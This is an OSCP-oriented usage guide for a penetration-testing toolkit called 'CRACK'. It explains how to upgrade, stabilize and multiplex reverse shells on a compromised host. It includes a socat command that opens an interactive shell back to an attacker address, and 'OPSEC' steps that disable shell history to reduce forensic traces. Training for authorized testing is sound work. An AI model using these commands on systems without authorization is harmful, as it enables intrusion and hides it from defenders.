# Shell Enhancement Guide

Complete guide to upgrading and stabilizing reverse shells for OSCP preparation.

## Table of Contents

1. [Overview](#overview)
2. [Detection](#detection)
3. [Upgrade Methods](#upgrade-methods)
4. [Stabilization](#stabilization)
5. [Multiplexing](#multiplexing)
6. [CLI Usage](#cli-usage)
7. [Manual Methods (OSCP Exam)](#manual-methods-oscp-exam)
8. [Troubleshooting](#troubleshooting)

---

## Overview

### Why Upgrade Shells?

Basic reverse shells lack:
- **PTY (Pseudo-Terminal)**: No Ctrl+C, arrow keys, tab completion
- **Job Control**: Can't background processes
- **Signal Handling**: Ctrl+C kills shell
- **Terminal Features**: No color, no text editors

### Upgrade Process Flow

```
Basic Shell → Detection → Upgrade → Stabilization → Multiplexing
     │             │           │            │              │
     │             │           │            │              └─ Parallel tasks
     │             │           │            └─ Terminal size, env vars, OPSEC
     │             │           └─ Python PTY, script, socat, expect
     │             └─ Shell type, OS, available tools
     └─ Limited, unstable, no PTY
```

---

## Detection

### Automatic Detection

```python
from sessions.shell import ShellDetector
from sessions.models import Session

# Create session
session = Session(type='tcp', target='192.168.45.150', port=4444)

# Detect capabilities
detector = ShellDetector()
caps = detector.detect_capabilities(session)

print(f"Shell: {caps.shell_type}")
print(f"OS: {caps.os_type}")
print(f"Has PTY: {caps.has_pty}")
print(f"Tools: {caps.detected_tools}")
```

### What Gets Detected

- **Shell Type**: bash, sh, zsh, powershell, cmd
- **OS Type**: linux, windows, macos, bsd
- **PTY Status**: Present or missing
- **Available Tools**: python3, python, socat, script, expect, tmux, screen, etc.

### Quick Detection

```python
# Fast detection (essential info only)
info = detector.quick_detect(session)
# Returns: {'shell_type': 'bash', 'os_type': 'linux', 'has_pty': False}
```

---

## Upgrade Methods

### 1. Python PTY Upgrade (Most Reliable)

**Automatic:**
```python
from sessions.shell import ShellUpgrader

upgrader = ShellUpgrader()
if upgrader.upgrade_shell(session, 'python-pty'):
    print("Python PTY upgrade successful!")
```

**Manual (OSCP Exam):**
```bash
# On victim shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background shell: Press Ctrl+Z

# On attacker terminal:
stty raw -echo; fg

# Back in victim shell:
export TERM=xterm-256color
stty rows 38 cols 116
```

**Requirements:**
- Python 3 or Python 2 installed
- Most reliable method
- OSCP exam safe

**Flags Explained:**
- `pty.spawn("/bin/bash")`: Spawn bash with PTY
- `stty raw`: Raw terminal mode (no input processing)
- `-echo`: Disable local echo
- `fg`: Foreground backgrounded process

---

### 2. Script Upgrade (Common Alternative)

**Automatic:**
```python
if upgrader.upgrade_shell(session, 'script'):
    print("Script upgrade successful!")
```

**Manual (OSCP Exam):**
```bash
# On victim shell:
script /dev/null -c bash
```

**Requirements:**
- `script` command available
- Less reliable than Python PTY
- OSCP exam safe

**Flags Explained:**
- `/dev/null`: Discard log output
- `-c bash`: Run bash as command

---

### 3. Socat Full TTY (Most Featured)

**Manual (OSCP Exam):**
```bash
# On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4445

# On victim (requires socat binary):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.X:4445
```

**Requirements:**
- Socat binary on victim (rare)
- Most feature-complete
- May need to upload socat binary

**Flags Explained:**
- `file:`tty``: Use current TTY
- `raw`: Raw terminal mode
- `echo=0`: Disable echo
- `exec:'bash -li'`: Execute interactive bash
- `pty`: Create pseudo-terminal
- `stderr`: Redirect stderr
- `setsid`: New session
- `sigint,sane`: Handle signals properly

---

### 4. Auto-Upgrade (Recommended)

**Tries all methods in priority order:**

```python
# Auto-select best method
if upgrader.upgrade_shell(session, 'auto'):
    print("Shell upgraded with best available method!")
```

**Priority Order:**
1. Python 3 PTY (most reliable)
2. Python 2 PTY (fallback)
3. script (widely available)
4. expect (rarely available)

---

### Upgrade Recommendations

```python
# Get recommended methods
recommendations = upgrader.get_upgrade_recommendations(session)

for rec in recommendations:
    print(f"{rec['priority']}: {rec['method']}")
    print(f"  Tool: {rec['tool']}")
    print(f"  Command: {rec['command']}")
    print(f"  OSCP Safe: {rec['oscp_safe']}")
```

---

## Stabilization

### Full Stabilization

**Automatic:**
```python
from sessions.shell import ShellStabilizer

stabilizer = ShellStabilizer()
if stabilizer.stabilize(session):
    print("Shell fully stabilized!")
```

**What Gets Stabilized:**
1. **Terminal Size**: Matches local terminal
2. **TERM Variable**: Enables color and features
3. **SHELL Variable**: Defines shell for subprocesses
4. **Signal Handling**: Clean Ctrl+C behavior
5. **History**: Disabled for OPSEC
6. **Custom Prompt**: [CRACK] indicator

---

### Manual Stabilization (OSCP Exam)

**Complete Steps:**
```bash
# 1. Fix terminal size (get local size first: stty size)
stty rows 38 cols 116

# 2. Set TERM variable
export TERM=xterm-256color

# 3. Set SHELL variable
export SHELL=/bin/bash

# 4. Configure signal handling
stty -echoctl

# 5. Disable history (OPSEC)
export HISTFILE=/dev/null
unset HISTFILE

# 6. Custom prompt (optional)
export PS1="\[\033[01;31m\][CRACK]\[\033[00m\] \w $ "
```

---

### Individual Stabilization Functions

**Terminal Size:**
```python
stabilizer.fix_terminal_size(session)
```

**Environment Variables:**
```python
stabilizer.set_term_variable(session)
stabilizer.set_shell_variable(session)
```

**Signal Handling:**
```python
stabilizer.configure_signal_handling(session)
```

**History (OPSEC):**
```python
# Disable history
stabilizer.disable_history(session)

# Re-enable if needed
stabilizer.enable_history(session)
```

**Custom Prompt:**
```python
# Default [CRACK] prompt
stabilizer.set_custom_prompt(session)

# Custom prompt
stabilizer.set_custom_prompt(session, prompt=r'\u@\h:\w\$ ')
```

---

### Stabilization Checklist

```python
# Get manual checklist
checklist = stabilizer.get_stabilization_checklist()

for step in checklist['steps']:
    print(f"{step['order']}. {step['name']}")
    print(f"   Command: {step['command']}")
    print(f"   Required: {step['required']}")
```

---

## Multiplexing

### Tmux Session Wrapping

**Why Use Tmux:**
- Session persistence across disconnects
- Multiple panes for parallel commands
- Run linpeas while manually enumerating
- Scroll-back buffer

**Automatic:**
```python
from sessions.shell import ShellMultiplexer

multiplexer = ShellMultiplexer()
if multiplexer.multiplex_tmux(session):
    print("Tmux session created!")
```

**Manual (OSCP Exam):**
```bash
# On victim shell:
tmux new -s crack_session

# Detach: Ctrl+B, then D
# Reattach: tmux attach -t crack_session

# Split horizontal (side-by-side): Ctrl+B, then %
# Split vertical (top/bottom): Ctrl+B, then "
# Switch panes: Ctrl+B, then arrow keys
```

---

### Screen Session Wrapping

**Alternative to tmux (older, more widely available):**

```python
if multiplexer.multiplex_screen(session):
    print("Screen session created!")
```

**Manual (OSCP Exam):**
```bash
# On victim shell:
screen -S crack_session

# Detach: Ctrl+A, then D
# Reattach: screen -r crack_session

# New window: Ctrl+A, then C
# Next window: Ctrl+A, then N
```

---

### Parallel Panes

**Use Case: Run linpeas in one pane, enumerate in another**

```python
# Create horizontal split (side-by-side)
multiplexer.create_parallel_pane(session, direction='horizontal')

# Create vertical split (top/bottom)
multiplexer.create_parallel_pane(session, direction='vertical')
```

**Manual:**
```bash
# Horizontal split: Ctrl+B, then %
# Vertical split: Ctrl+B, then "
# Switch panes: Ctrl+B, then arrow keys
```

---

### Multiplexer Guide

```python
# Get complete tmux/screen reference
guide = multiplexer.get_multiplexer_guide()

print("Tmux Commands:")
for cmd in guide['tmux']['commands']:
    print(f"  {cmd['action']}: {cmd['keys']}")

print("\nOSCP Use Cases:")
for case in guide['tmux']['oscp_use_cases']:
    print(f"  - {case}")
```

---

## CLI Usage

### Detection

```bash
# Detect shell capabilities
crack session detect <session_id>

# Output:
# Shell Type: bash
# OS: linux
# Has PTY: false
# Available Tools: python3, script, bash, stty
```

---

### Upgrade

```bash
# Auto-upgrade (recommended)
crack session upgrade <session_id>

# Specific method
crack session upgrade <session_id> --method python-pty
crack session upgrade <session_id> --method script

# Get recommendations
crack session recommendations <session_id>
```

---

### Stabilization

```bash
# Stabilize shell
crack session stabilize <session_id>

# Stabilize with history enabled
crack session stabilize <session_id> --keep-history

# Custom prompt
crack session stabilize <session_id> --prompt "\\u@\\h:\\w\$ "
```

---

### Multiplexing

```bash
# Wrap in tmux
crack session multiplex <session_id> --tmux

# Wrap in screen
crack session multiplex <session_id> --screen

# Create parallel pane
crack session pane <session_id> --horizontal
```

---

## Manual Methods (OSCP Exam)

### Complete Upgrade + Stabilization Workflow

**1. Python PTY Upgrade:**
```bash
# Victim shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background

# Attacker terminal:
stty raw -echo; fg

# Victim shell (after fg):
export TERM=xterm-256color
stty rows 38 cols 116
```

**2. Stabilization:**
```bash
# Fix signal handling
stty -echoctl

# Disable history (OPSEC)
export HISTFILE=/dev/null
unset HISTFILE
```

**3. Optional: Tmux for Persistence**
```bash
tmux new -s oscp
# Detach with Ctrl+B, D if connection drops
# Reattach with: tmux attach -t oscp
```

---

### Quick Reference Card

**Get Local Terminal Size:**
```bash
# On attacker:
stty size
# Returns: 38 116 (rows cols)
```

**Common Issues:**

| Issue | Solution |
|-------|----------|
| Ctrl+C kills shell | Need PTY upgrade |
| No arrow keys | Need PTY upgrade |
| No tab completion | Need PTY upgrade |
| Terminal too small | `stty rows X cols Y` |
| No colors | `export TERM=xterm-256color` |
| Commands logged | `export HISTFILE=/dev/null; unset HISTFILE` |

---

## Troubleshooting

### Upgrade Failed

**Check available tools:**
```python
caps = detector.detect_capabilities(session)
print(f"Available tools: {caps.detected_tools}")

# Try alternative method
if 'python3' not in caps.detected_tools and 'script' in caps.detected_tools:
    upgrader.upgrade_shell(session, 'script')
```

**Manual fallback:**
```bash
# If Python unavailable, try script:
script /dev/null -c bash

# If both unavailable, basic stabilization:
export TERM=xterm
```

---

### Validation Failed

**Test PTY status:**
```python
if not upgrader.validate_upgrade(session):
    print("Upgrade validation failed")

    # Check PTY manually
    has_pty = detector.check_pty_status(session)
    print(f"PTY status: {has_pty}")
```

**Manual PTY test:**
```bash
# On victim shell:
tty
# Should show: /dev/pts/X (PTY present)
# Or: not a tty (no PTY)
```

---

### Terminal Size Mismatch

**Fix manually:**
```bash
# On attacker (get size):
stty size
# Example output: 38 116

# On victim:
stty rows 38 cols 116
```

---

### History Not Disabled

**Verify OPSEC:**
```bash
# Check HISTFILE
echo $HISTFILE
# Should show: /dev/null or empty

# Check history is disabled
history
# Should show: empty or "history disabled"
```

---

### Tmux/Screen Not Available

**Check availability:**
```python
tools = detector.detect_tools(session)
if 'tmux' not in tools and 'screen' not in tools:
    print("No multiplexer available - use basic shell")
```

**Fallback strategy:**
- Run long tasks with `nohup command &`
- Use `disown` for backgrounding
- Multiple shells via new connections

---

## Best Practices

### OSCP Exam

1. **Always upgrade shells** - PTY makes enumeration easier
2. **Disable history** - Reduce forensic artifacts
3. **Use tmux/screen** - Persist sessions across disconnects
4. **Test validation** - Ensure Ctrl+C doesn't kill shell
5. **Document methods** - Note which upgrade method worked

### OPSEC

1. **Disable history**: `export HISTFILE=/dev/null; unset HISTFILE`
2. **Clear on exit**: `history -c` (if history enabled)
3. **No persistent artifacts**: Use in-memory only
4. **Clean prompt**: Avoid revealing attack infrastructure

### Performance

1. **Use auto-upgrade** - Fastest method selection
2. **Cache capabilities** - Don't re-detect repeatedly
3. **Validate once** - After upgrade completes
4. **Background scans** - Use tmux panes for parallel work

---

## Integration Example

**Complete workflow:**

```python
from sessions.shell import ShellUpgrader, ShellStabilizer, ShellMultiplexer
from sessions.models import Session

# Create session
session = Session(type='tcp', target='192.168.45.150', port=4444)

# Auto-upgrade
upgrader = ShellUpgrader()
if upgrader.upgrade_shell(session, 'auto'):
    print("[+] Shell upgraded successfully")

    # Validate
    if upgrader.validate_upgrade(session):
        print("[+] Upgrade validated")

        # Stabilize
        stabilizer = ShellStabilizer()
        if stabilizer.stabilize(session, disable_history=True):
            print("[+] Shell stabilized with OPSEC")

            # Wrap in tmux
            multiplexer = ShellMultiplexer()
            if multiplexer.multiplex_tmux(session):
                print("[+] Tmux session created")

                # Create parallel pane
                multiplexer.create_parallel_pane(session, 'horizontal')
                print("[+] Parallel pane ready for linpeas")

                print("\n[*] Shell fully enhanced and ready!")
else:
    print("[-] Upgrade failed - check available tools")
```

---

## Reference

### Event System

```python
from sessions.events import EventBus, SessionEvent

# Subscribe to upgrade events
def on_upgrade(data):
    session_id = data['session_id']
    method = data['method']
    print(f"Session {session_id} upgraded with {method}")

EventBus.subscribe(SessionEvent.SESSION_UPGRADED, on_upgrade)

# Subscribe to stabilization events
def on_stabilized(data):
    session_id = data['session_id']
    print(f"Session {session_id} stabilized")

EventBus.subscribe(SessionEvent.SESSION_STABILIZED, on_stabilized)
```

---

## Additional Resources

- **Python PTY Module**: https://docs.python.org/3/library/pty.html
- **Tmux Cheat Sheet**: https://tmuxcheatsheet.com/
- **Screen Manual**: https://www.gnu.org/software/screen/manual/
- **OSCP Shell Upgrade Guide**: HackTricks, PayloadsAllTheThings

---

**Last Updated**: 2025-10-09
**CRACK Version**: 1.0.0
**OSCP Exam Safe**: Yes
